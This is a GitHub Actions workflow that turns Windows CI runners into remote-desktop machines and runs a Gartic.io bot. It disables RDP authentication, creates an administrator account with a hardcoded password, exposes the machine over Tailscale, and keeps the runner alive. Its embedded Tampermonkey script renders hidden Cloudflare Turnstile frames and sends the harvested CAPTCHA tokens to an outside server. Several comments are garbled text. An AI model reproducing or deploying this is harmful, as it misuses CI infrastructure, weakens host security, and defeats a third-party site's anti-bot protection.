jobs:
  gartic-bot:
    runs-on: windows-2019
    timeout-minutes: 360
    strategy:
      matrix:
        rdp_node: [1, 2]
    
    steps:
      - name: 1. Checkout Script
        uses: actions/checkout@v3
      
      - name: 2. Configure RDP
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389

      - name: 3. Create RDP User
        run: |
          $password = "admin@123"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "saif123" -Password $securePass -AccountNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "saif123" -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "saif123" -ErrorAction SilentlyContinue

      - name: 4. Setup Firefox Profile + Tampermonkey Script
        run: |
          # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù ØªØ¹Ø±ÙŠÙ Firefox Ø«Ø§Ø¨Øª
          $profilePath = "C:\GarticProfile"
          New-Item -ItemType Directory -Force -Path $profilePath
          
          # Ø¥Ø¹Ø¯Ø§Ø¯ user.js
          @"
          user_pref("browser.startup.homepage", "about:blank");
          user_pref("browser.shell.checkDefaultBrowser", false);
          user_pref("extensions.autoDisableScopes", 0);
          user_pref("extensions.enabledScopes", 15);
          "@ | Out-File "$profilePath\user.js" -Encoding ASCII
          
          # ØªØ­Ø¶ÙŠØ± Ù…Ø¬Ù„Ø¯ Tampermonkey Script
          $tampermonkeyDir = "$profilePath\gm_scripts"
          New-Item -ItemType Directory -Force -Path $tampermonkeyDir
          
          # Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø³ÙƒØ±Ø¨Øª
          @'
// ==UserScript==
// @name         Gartic.io Token Fetcher (Optimized Reload Version)
// @namespace    http://tampermonkey.net/
// @version      0.5
// @description  Fetch maximum tokens from Turnstile with minimal data usage + auto reload every 50s
// @author       You
// @match        *://gartic.io/*
// @match        *://*.gartic.io/*
// @grant        none
// ==/UserScript==
(function () {
    'use strict';
    const TOKEN_INTERVAL = 3500;
    const NUM_IFRAMES = 6;
    const BACKEND_URL = 'https://www.xsw.work.gd/add-token';
    
    setInterval(() => { location.reload(); }, 50000);
    
    function sendToken(token) {
        if (typeof token !== 'string' || token.length <= 20) return;
        console.log("Token received:", token);
        fetch(BACKEND_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token })
        }).catch(() => {});
    }
    
    function createTurnstileFrames() {
        window.addEventListener('message', function(event) {
            if (event.data && typeof event.data === 'string') {
                sendToken(event.data);
            }
        });
        
        for (let i = 0; i < NUM_IFRAMES; i++) {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.sandbox = 'allow-scripts allow-same-origin';
            document.body.appendChild(iframe);
            
            const html = `
                <!DOCTYPE html>
                <html>
                <head>
                    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
                </head>
                <body>
                    <div id="cf-turnstile"></div>
                    <script>
                        function requestToken() {
                            try {
                                window.turnstile.render('#cf-turnstile', {
                                    sitekey: '0x4AAAAAABBPKaIbNwnPEfSo',
                                    callback: function(token) {
                                        parent.postMessage(token, '*');
                                    }
                                });
                            } catch (e) {}
                        }
                        setInterval(requestToken, ${TOKEN_INTERVAL});
                        setTimeout(requestToken, 200);
                    </script>
                </body>
                </html>
            `;
            iframe.srcdoc = html;
        }
    }
    
    createTurnstileFrames();
})();
'@ | Out-File "$tampermonkeyDir\gartic-token.user.js" -Encoding UTF8

      - name: 5. Install Firefox Extensions
        run: |
          $firefoxDir = "C:\Program Files\Mozilla Firefox"
          $distDir = "$firefoxDir\distribution"
          if (!(Test-Path $distDir)) { New-Item -ItemType Directory -Force -Path $distDir }
          
          $policies = @{
              policies = @{
                  Extensions = @{
                      Install = @(
                          "https://addons.mozilla.org/firefox/downloads/latest/tampermonkey/latest.xpi"
                      )
                  }
                  DisableAppUpdate = $true
                  DontCheckDefaultBrowser = $true
              }
          }
          $policies | ConvertTo-Json -Depth 4 | Out-File "$distDir\policies.json" -Encoding UTF8

      - name: 6. Create Auto-Start Script (2 Tabs)
        run: |
          # Ø³ÙƒØ±Ø¨Øª PowerShell Ù„ÙØªØ­ ØµÙØ­ØªÙŠÙ†
          $startScript = @'
Start-Sleep -Seconds 5
$firefox = "C:\Program Files\Mozilla Firefox\firefox.exe"
$profile = "C:\GarticProfile"

# ÙØªØ­ Ø£ÙˆÙ„ ØµÙØ­Ø©
Start-Process $firefox -ArgumentList "-profile `"$profile`" -new-window https://gartic.io"
Start-Sleep -Seconds 3

# ÙØªØ­ Ø«Ø§Ù†ÙŠ ØµÙØ­Ø© ÙÙŠ ØªØ§Ø¨ Ø¬Ø¯ÙŠØ¯
Start-Process $firefox -ArgumentList "-profile `"$profile`" -new-tab https://gartic.io"
'@
          $startScript | Out-File "C:\StartGartic.ps1" -Encoding UTF8
          
          # Ø¥Ù†Ø´Ø§Ø¡ Scheduled Task
          $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\StartGartic.ps1"
          $trigger = New-ScheduledTaskTrigger -AtLogOn -User "saif123"
          $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
          Register-ScheduledTask -TaskName "GarticAutoStart" -Action $action -Trigger $trigger -Settings $settings -User "saif123" -RunLevel Highest -Force

      - name: 7. Import Tampermonkey Script
        run: |
          # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù ØªÙƒÙˆÙŠÙ† Tampermonkey
          $configPath = "C:\GarticProfile\tampermonkey-config.json"
          $config = @{
              scripts = @(
                  @{
                      name = "Gartic.io Token Fetcher"
                      code = (Get-Content "C:\GarticProfile\gm_scripts\gartic-token.user.js" -Raw)
                      enabled = $true
                  }
              )
          }
          $config | ConvertTo-Json -Depth 5 | Out-File $configPath -Encoding UTF8

      - name: 8. Start Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
          Invoke-WebRequest -Uri $tsUrl -OutFile "$env:TEMP\tailscale.exe"
          Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet", "/norestart" -Wait
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="gartic-${{ matrix.rdp_node }}"

      - name: 9. Launch Firefox Now + Info
        run: |
          $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          echo "::notice title=ğŸš€ RDP Node ${{ matrix.rdp_node }} Ready::IP: $ip | User: saif123 | Pass: admin@123 | Firefox will auto-start with 2 tabs on reconnect!"
          
          # ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¢Ù†
          Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\StartGartic.ps1"
          
          Write-Host "âœ… Firefox launched with 2 Gartic.io tabs + Script injected!"
          Write-Host "ğŸ”„ On RDP reconnect, Firefox will auto-start again!"
          
          while ($true) { Start-Sleep -Seconds 300 }
